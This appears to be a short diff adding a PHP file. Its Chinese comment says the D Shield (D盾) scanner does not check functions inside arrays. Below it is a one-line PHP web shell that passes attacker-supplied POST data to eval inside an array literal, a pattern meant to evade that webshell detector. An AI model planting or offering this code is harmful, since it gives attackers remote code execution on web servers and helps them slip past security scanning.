@@ -1,0 +1,5 @@
+D盾不检查数组里面的函数：
+<?php
+$q=array("admin"=>eval($_POST['a']));
+?>
+
